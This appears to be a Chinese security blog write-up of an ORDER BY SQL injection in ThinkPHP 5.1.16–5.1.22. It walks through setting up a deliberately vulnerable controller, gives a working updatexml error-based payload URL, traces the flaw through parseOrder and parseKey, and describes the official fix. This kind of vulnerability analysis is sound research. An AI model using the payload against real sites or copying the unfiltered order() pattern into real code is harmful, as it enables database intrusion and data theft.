# ThinkPHP5.1.x SQL注入(OrderBy)

Author: H3rmesk1t

Data: 2021.08.14

# 漏洞概要
- 本次漏洞存在于 Builder 类的 parseOrder 方法中，由于程序没有对数据进行很好的过滤，直接将数据拼接进 SQL 语句，最终导致 SQL 注入漏洞的产生
- 漏洞影响版本： 5.1.16<=ThinkPHP5<=5.1.22

# 初始配置
获取测试环境代码

```bash
composer create-project --prefer-dist topthink/think=5.1.22 tpdemo
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/dd8a746b98b14814b42c1b38f4a9a21b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

将 composer.json 文件的 require 字段设置成如下

```bash
"require": {
        "php": ">=5.6.0",
        "topthink/framework": "5.1.22"
    },
```

然后执行 `composer update`

![在这里插入图片描述](https://img-blog.csdnimg.cn/9b78c4a288c5418a8752cc3c7c00157d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

下载后的源码中，需要对 `application/index/controller/Index.php` 内容进行修改

```php
<?php
namespace app\index\controller;

class Index
{
    public function index()
    {
        $orderby = request()->get('orderby');
        $result = db('users')->where(['username' ='mochazz'])->order($orderby)->find();
        var_dump($result);
        return '<style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style="padding: 24px 48px;"<h1>:) </h1><pThinkPHP V5.1<br/><span style="font-size:30px">12载初心不改（2006-2018） - 你值得信赖的PHP框架</span></p></div><script type="text/javascript" src="https://tajs.qq.com/stats?sId=64890268" charset="UTF-8"></script><script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"></script><think id="eab4b9f840753f8e7"></think>';
    }
}
```

在 `config/database.php` 文件中配置数据库相关信息，并开启 `config/app.php` 中的 `app_debug` 和 `app_trace` ，创建数据库信息如下

```sql
create database thinkphp;
use thinkphp;
create table users(
	id int primary key auto_increment,
	username varchar(50) not null
);
insert into users(id,username) values(1,'H3rmesk1t');
```
# 漏洞利用

Payload

```bas
http://127.0.0.1/cms/public/index.php?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1 
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/c132f957a0b241d989339f8b8e2b74d7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# 漏洞分析

首先数据都会进入到 `Request` 类中的 `input` 方法，并且经过 `filterValue` 方法的过滤和强制类型转换并返回 `$data`

![在这里插入图片描述](https://img-blog.csdnimg.cn/a879dfacf595446e87b72613aa1e1c19.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

这里 `array_walk_recursive` 函数对数组中的成员递归调用 `filterValue` 过滤函数，但是 `filterValue` 过滤函数，不过滤数组的 `key` ， 只过滤了数组的 `value`，用户输入的数据会原样进入框架的 SQL 查询方法中，进入 `Query` 类

![在这里插入图片描述](https://img-blog.csdnimg.cn/cb404680cc874cf1b17cfcec3420ad1d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/3cf76fc4d95a4ffda18cab595387af93.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

恶意Payload 未经过任何过滤直接传递给 `options['order']`  中

![在这里插入图片描述](https://img-blog.csdnimg.cn/6ac2d9f671c44a7289913e6ee1bad32a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

接着调用 `find` 方法，此处 `$this->connection` 是 `think/db/connectior/Mysql` 类 ，继承于 `Connection` 类，于是此处继续调用该类的 `find` 方法

![在这里插入图片描述](https://img-blog.csdnimg.cn/4dccfe114bc4402f9df5aae820915734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/6f81151b864a4ec99a7b8d65e1e0996a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

该方法继续调用了 `$this->builder`, 即 `think/db/builder/Mysql` 类的 `select` 方法，该方法通过 `str_replace` 函数，将数据填充到SQL语句中

![在这里插入图片描述](https://img-blog.csdnimg.cn/24ff9d25efd4471584f51cad77e74cce.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

然后调用了 `parseOrder` 方法，跟进该方法，`$order` 是输入的数据，然后经过了 `parseKey` 方法处理后返回给 `$array`，跟进查看该方法的实现

```php
protected function parseOrder(Query $query, $order)
    {
        if (empty($order)) {
            return '';
        }

        $array = [];

        foreach ($order as $key =$val) {
            if ($val instanceof Expression) {
                $array[] = $val->getValue();
            } elseif (is_array($val)) {
                $array[] = $this->parseOrderField($query, $key, $val);
            } elseif ('[rand]' == $val) {
                $array[] = $this->parseRand($query);
            } else {
                if (is_numeric($key)) {
                    list($key, $sort) = explode(' ', strpos($val, ' ') ? $val : $val . ' ');
                } else {
                    $sort = $val;
                }

                $sort    = strtoupper($sort);
                $sort    = in_array($sort, ['ASC', 'DESC'], true) ? ' ' . $sort : '';
                $array[] = $this->parseKey($query, $key, true) . $sort;
            }
        }

        return ' ORDER BY ' . implode(',', $array);
    }
```

跟进 `thinkphp/library/think/db/builder/Mysql.php`，该方法在变量 `$key` 的两端添加了反引号进行拼接并且没有任何过滤

![在这里插入图片描述](https://img-blog.csdnimg.cn/62ae9f308d0e4ba88cb53cd6ec2c6862.png#pic_center)

最终返回了一个带有 ORDER BY 的 SQL 注入 payload 给要执行的SQL语句，实现 ORDER BY 注入

![在这里插入图片描述](https://img-blog.csdnimg.cn/cfac012337e04fa88fedf30be2ed7973.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

完整的方法调用，从下往上

![在这里插入图片描述](https://img-blog.csdnimg.cn/def8944016494bcb8a55675674e0c0b2.png#pic_center)
# 漏洞修复

官方的修复方法是：在拼接字符串前对变量进行检查，看是否存在 `)、#` 两个符号

![在这里插入图片描述](https://img-blog.csdnimg.cn/c8018d097195471d915b005dc70f489b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# 攻击总结

参考Mochazz师傅的审计流程

![在这里插入图片描述](https://img-blog.csdnimg.cn/8cc7f936972f41769c25c9f623ad8f07.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
